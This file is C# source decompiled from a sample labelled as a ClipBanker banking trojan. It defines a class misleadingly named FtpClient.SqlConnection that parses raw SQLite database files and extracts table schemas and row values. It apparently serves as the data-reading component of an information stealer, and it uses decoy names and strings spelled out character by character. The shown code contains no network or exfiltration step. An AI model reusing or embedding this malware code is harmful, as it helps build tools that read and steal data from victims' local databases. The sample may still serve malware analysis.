// Decompiled with JetBrains decompiler
// Type: FtpClient.SqlConnection
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Enums;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace FtpClient
{
  public class SqlConnection
  {
    private byte[] DataArray { get; }

    private ulong DataEncoding { get; }

    public string[] Fields { get; set; }

    public int RowLength => this.SqlRows.Length;

    private ushort PageSize { get; }

    private DataEntry[] DataEntries { get; set; }

    private TableRow[] SqlRows { get; set; }

    private byte[] SQLDataTypeSize { get; }

    public string basePath { get; }

    public SqlConnection(string baseName)
    {
      try
      {
        this.basePath = baseName;
        this.SQLDataTypeSize = new byte[19]
        {
          (byte) 0,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 6,
          (byte) 8,
          (byte) 8,
          (byte) 0,
          (byte) 0,
          (byte) 0,
          (byte) 1,
          (byte) 2,
          (byte) 5,
          (byte) 2,
          (byte) 1,
          (byte) 6,
          (byte) 2,
          (byte) 1
        };
        this.DataArray = File.ReadAllBytes(baseName);
        this.PageSize = (ushort) this.ToULong(16, 2);
        this.DataEncoding = this.ToULong(56, 4);
        if (Decimal.Compare(new Decimal(this.DataEncoding), 0M) == 0)
          this.DataEncoding = 1UL;
        this.ReadDataEntries(100UL);
      }
      catch
      {
      }
    }

    public string ParseValue(int rowIndex, int fieldIndex)
    {
      try
      {
        return rowIndex >= this.SqlRows.Length || fieldIndex >= this.SqlRows[rowIndex].RawData.Count ? (string) null : this.SqlRows[rowIndex].RawData[fieldIndex];
      }
      catch
      {
        return (string) null;
      }
    }

    public string ParseValue(int rowIndex, string fieldName)
    {
      try
      {
        int fieldIndex = -1;
        int num = this.Fields.Length - 1;
        for (int index = 0; index <= num; ++index)
        {
          if (this.Fields[index].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
          {
            fieldIndex = index;
            break;
          }
        }
        return fieldIndex == -1 ? (string) null : this.ParseValue(rowIndex, fieldIndex);
      }
      catch
      {
        return (string) null;
      }
    }

    public bool ReadTable(string tableName)
    {
      try
      {
        int index1 = -1;
        int num1 = this.DataEntries.Length - 1;
        for (int index2 = 0; index2 <= num1; ++index2)
        {
          if (this.DataEntries[index2].Name.ToLower().CompareTo(tableName.ToLower()) == 0)
          {
            index1 = index2;
            break;
          }
        }
        if (index1 == -1)
          return false;
        string[] strArray = this.DataEntries[index1].State.Substring(this.DataEntries[index1].State.IndexOf("(") + 1).Split(',');
        int num2 = strArray.Length - 1;
        for (int index3 = 0; index3 <= num2; ++index3)
        {
          strArray[index3] = strArray[index3].TrimStart();
          int length = strArray[index3].IndexOf(" ");
          if (length > 0)
            strArray[index3] = strArray[index3].Substring(0, length);
          if (strArray[index3].IndexOf("UNIQUE") != 0)
          {
            this.Fields = (string[]) Utils.CopyArray((Array) this.Fields, (Array) new string[index3 + 1]);
            this.Fields[index3] = strArray[index3];
          }
          else
            break;
        }
        return this.ReadDataEntriesFromOffsets((ulong) (this.DataEntries[index1].RootNum - 1L) * (ulong) this.PageSize);
      }
      catch
      {
        return false;
      }
    }

    private ulong ToULong(int startIndex, int Size)
    {
      if (Size > 8 || Size == 0)
        return 0;
      ulong num = 0;
      for (int index = 0; index <= Size - 1; ++index)
        num = num << 8 | (ulong) this.DataArray[startIndex + index];
      return num;
    }

    private long CalcVertical(int startIndex, int endIndex)
    {
      ++endIndex;
      byte[] numArray = new byte[8];
      int num1 = endIndex - startIndex;
      bool flag = false;
      if (num1 == 0 | num1 > 9)
        return 0;
      switch (num1)
      {
        case 1:
          numArray[0] = (byte) ((uint) this.DataArray[startIndex] & (uint) sbyte.MaxValue);
          return BitConverter.ToInt64(numArray, 0);
        case 9:
          flag = true;
          break;
      }
      int num2 = 1;
      int num3 = 7;
      int index1 = 0;
      if (flag)
      {
        numArray[0] = this.DataArray[endIndex - 1];
        --endIndex;
        index1 = 1;
      }
      int num4 = startIndex;
      for (int index2 = endIndex - 1; index2 >= num4; index2 += -1)
      {
        if (index2 - 1 >= startIndex)
        {
          numArray[index1] = (byte) ((uint) (byte) ((uint) this.DataArray[index2] >> (num2 - 1 & 7)) & (uint) ((int) byte.MaxValue >> num2) | (uint) (byte) ((uint) this.DataArray[index2 - 1] << (num3 & 7)));
          ++num2;
          ++index1;
          --num3;
        }
        else if (!flag)
          numArray[index1] = (byte) ((uint) (byte) ((uint) this.DataArray[index2] >> (num2 - 1 & 7)) & (uint) ((int) byte.MaxValue >> num2));
      }
      return BitConverter.ToInt64(numArray, 0);
    }

    private int GetValues(int startIndex)
    {
      if (startIndex > this.DataArray.Length)
        return 0;
      int num = startIndex + 8;
      for (int values = startIndex; values <= num; ++values)
      {
        if (values > this.DataArray.Length - 1)
          return 0;
        if (((int) this.DataArray[values] & 128) != 128)
          return values;
      }
      return startIndex + 8;
    }

    public static bool ItIsOdd(long value) => (value & 1L) == 1L;

    private void ReadDataEntries(ulong Offset)
    {
      try
      {
        if (this.DataArray[(int) Offset] == (byte) 13)
        {
          ushort num1 = (this.ToULong((Offset.ChangeType<Decimal>() + 3M).ChangeType<int>(), 2).ChangeType<Decimal>() - 1M).ChangeType<ushort>();
          int num2 = 0;
          if (this.DataEntries != null)
          {
            num2 = this.DataEntries.Length;
            this.DataEntries = (DataEntry[]) Utils.CopyArray((Array) this.DataEntries, (Array) new DataEntry[this.DataEntries.Length + (int) num1 + 1]);
          }
          else
            this.DataEntries = new DataEntry[(int) num1 + 1];
          int num3 = (int) num1;
          for (int index1 = 0; index1 <= num3; ++index1)
          {
            ulong this1 = this.ToULong((Offset.ChangeType<Decimal>() + 8M + (index1 * 2).ChangeType<Decimal>()).ChangeType<int>(), 2);
            if (Decimal.Compare(Offset.ChangeType<Decimal>(), 100M) != 0)
              this1 += Offset;
            int values1 = this.GetValues(this1.ChangeType<int>());
            this.CalcVertical(this1.ChangeType<int>(), values1);
            int values2 = this.GetValues((this1.ChangeType<Decimal>() + values1.ChangeType<Decimal>() - this1.ChangeType<Decimal>() + 1M).ChangeType<int>());
            this.DataEntries[num2 + index1].ID = this.CalcVertical((this1.ChangeType<Decimal>() + values1.ChangeType<Decimal>() - this1.ChangeType<Decimal>() + 1M).ChangeType<int>(), values2);
            ulong this2 = (this1.ChangeType<Decimal>() + values2.ChangeType<Decimal>() - this1.ChangeType<Decimal>() + 1M).ChangeType<ulong>();
            int values3 = this.GetValues(this2.ChangeType<int>());
            int endIndex = values3;
            long num4 = this.CalcVertical(this2.ChangeType<int>(), values3);
            long[] numArray = new long[5];
            int index2 = 0;
            do
            {
              int startIndex = endIndex + 1;
              endIndex = this.GetValues(startIndex);
              numArray[index2] = this.CalcVertical(startIndex, endIndex);
              numArray[index2] = numArray[index2] <= 9L ? (long) this.SQLDataTypeSize[(int) numArray[index2]] : (!SqlConnection.ItIsOdd(numArray[index2]) ? (long) Math.Round((double) (numArray[index2] - 12L) / 2.0) : (long) Math.Round((double) (numArray[index2] - 13L) / 2.0));
              ++index2;
            }
            while (index2 <= 4);
            Encoding encoding = Encoding.GetEncoding(new string(new char[12]
            {
              'w',
              'i',
              'n',
              'd',
              'o',
              'w',
              's',
              '-',
              '1',
              '2',
              '5',
              '1'
            }));
            Decimal num5 = this.DataEncoding.ChangeType<Decimal>();
            Decimal num6 = 1M;
            if (!num6.Equals(num5))
            {
              num6 = 2M;
              if (!num6.Equals(num5))
              {
                num6 = 3M;
                if (num6.Equals(num5))
                  encoding = Encoding.BigEndianUnicode;
              }
              else
                encoding = Encoding.Unicode;
            }
            else
              encoding = Encoding.GetEncoding(new string(new char[12]
              {
                'w',
                'i',
                'n',
                'd',
                'o',
                'w',
                's',
                '-',
                '1',
                '2',
                '5',
                '1'
              }));
            this.DataEntries[num2 + index1].Type = encoding.GetString(this.DataArray, Convert.ToInt32(Decimal.Add(new Decimal(this2), new Decimal(num4))), (int) numArray[0]);
            this.DataEntries[num2 + index1].Name = encoding.GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(this2), new Decimal(num4)), new Decimal(numArray[0]))), (int) numArray[1]);
            this.DataEntries[num2 + index1].RootNum = (long) this.ToULong(Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(this2), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3]);
            this.DataEntries[num2 + index1].State = encoding.GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(this2), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), (int) numArray[4]);
          }
        }
        else
        {
          if (this.DataArray[(int) Offset] != (byte) 5)
            return;
          int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ToULong(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          for (int index = 0; index <= uint16; ++index)
          {
            ushort startIndex = (ushort) this.ToULong(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(index * 2))), 2);
            if (Decimal.Compare(new Decimal(Offset), 100M) == 0)
              this.ReadDataEntries(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ToULong((int) startIndex, 4)), 1M), new Decimal((int) this.PageSize))));
            else
              this.ReadDataEntries(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ToULong((int) ((long) Offset + (long) startIndex), 4)), 1M), new Decimal((int) this.PageSize))));
          }
          this.ReadDataEntries(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ToULong(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) this.PageSize))));
        }
      }
      catch
      {
      }
    }

    private bool ReadDataEntriesFromOffsets(ulong Offset)
    {
      try
      {
        if (this.DataArray[(int) Offset] == (byte) 13)
        {
          int int32 = Convert.ToInt32(Decimal.Subtract(new Decimal(this.ToULong(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          int num1 = 0;
          if (this.SqlRows != null)
          {
            num1 = this.SqlRows.Length;
            this.SqlRows = (TableRow[]) Utils.CopyArray((Array) this.SqlRows, (Array) new TableRow[this.SqlRows.Length + int32 + 1]);
          }
          else
            this.SqlRows = new TableRow[int32 + 1];
          int num2 = int32;
          for (int index1 = 0; index1 <= num2; ++index1)
          {
            TypeSizes[] arySrc = (TypeSizes[]) null;
            ulong startIndex1 = this.ToULong(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 8M), new Decimal(index1 * 2))), 2);
            if (Decimal.Compare(new Decimal(Offset), 100M) != 0)
              startIndex1 += Offset;
            int values1 = this.GetValues((int) startIndex1);
            this.CalcVertical((int) startIndex1, values1);
            int values2 = this.GetValues(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(startIndex1), Decimal.Subtract(new Decimal(values1), new Decimal(startIndex1))), 1M)));
            this.SqlRows[num1 + index1].Idenifier = (object) this.CalcVertical(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(startIndex1), Decimal.Subtract(new Decimal(values1), new Decimal(startIndex1))), 1M)), values2);
            ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(startIndex1), Decimal.Subtract(new Decimal(values2), new Decimal(startIndex1))), 1M));
            int values3 = this.GetValues((int) uint64);
            int endIndex = values3;
            long num3 = this.CalcVertical((int) uint64, values3);
            long num4 = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal(uint64), new Decimal(values3)), 1M));
            int index2 = 0;
            while (num4 < num3)
            {
              arySrc = (TypeSizes[]) Utils.CopyArray((Array) arySrc, (Array) new TypeSizes[index2 + 1]);
              int startIndex2 = endIndex + 1;
              endIndex = this.GetValues(startIndex2);
              arySrc[index2].Type = this.CalcVertical(startIndex2, endIndex);
              arySrc[index2].Size = arySrc[index2].Type <= 9L ? (long) this.SQLDataTypeSize[(int) arySrc[index2].Type] : (!SqlConnection.ItIsOdd(arySrc[index2].Type) ? (long) Math.Round((double) (arySrc[index2].Type - 12L) / 2.0) : (long) Math.Round((double) (arySrc[index2].Type - 13L) / 2.0));
              num4 = num4 + (long) (endIndex - startIndex2) + 1L;
              ++index2;
            }
            this.SqlRows[num1 + index1].RawData = ((IEnumerable<string>) new string[arySrc.Length - 1 + 1]).ToList<string>();
            int num5 = 0;
            int num6 = arySrc.Length - 1;
            for (int index3 = 0; index3 <= num6; ++index3)
            {
              if (arySrc[index3].Type > 9L)
              {
                if (!SqlConnection.ItIsOdd(arySrc[index3].Type))
                {
                  if (Decimal.Compare(new Decimal(this.DataEncoding), 1M) == 0)
                    this.SqlRows[num1 + index1].RawData[index3] = Encoding.GetEncoding(new string(new char[12]
                    {
                      'w',
                      'i',
                      'n',
                      'd',
                      'o',
                      'w',
                      's',
                      '-',
                      '1',
                      '2',
                      '5',
                      '1'
                    })).GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num3)), new Decimal(num5))), (int) arySrc[index3].Size);
                  else if (Decimal.Compare(new Decimal(this.DataEncoding), 2M) == 0)
                    this.SqlRows[num1 + index1].RawData[index3] = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num3)), new Decimal(num5))), (int) arySrc[index3].Size);
                  else if (Decimal.Compare(new Decimal(this.DataEncoding), 3M) == 0)
                    this.SqlRows[num1 + index1].RawData[index3] = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num3)), new Decimal(num5))), (int) arySrc[index3].Size);
                }
                else
                  this.SqlRows[num1 + index1].RawData[index3] = Encoding.GetEncoding(new string(new char[12]
                  {
                    'w',
                    'i',
                    'n',
                    'd',
                    'o',
                    'w',
                    's',
                    '-',
                    '1',
                    '2',
                    '5',
                    '1'
                  })).GetString(this.DataArray, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num3)), new Decimal(num5))), (int) arySrc[index3].Size);
              }
              else
                this.SqlRows[num1 + index1].RawData[index3] = arySrc[index3].Type != 9L ? Convert.ToString(this.ToULong(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num3)), new Decimal(num5))), (int) arySrc[index3].Size)) : "1";
              num5 += (int) arySrc[index3].Size;
            }
          }
        }
        else if (this.DataArray[(int) Offset] == (byte) 5)
        {
          int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ToULong(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          for (int index = 0; index <= uint16; ++index)
          {
            ushort num = (ushort) this.ToULong(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(index * 2))), 2);
            this.ReadDataEntriesFromOffsets(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ToULong((int) ((long) Offset + (long) num), 4)), 1M), new Decimal((int) this.PageSize))));
          }
          this.ReadDataEntriesFromOffsets(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ToULong(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) this.PageSize))));
        }
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
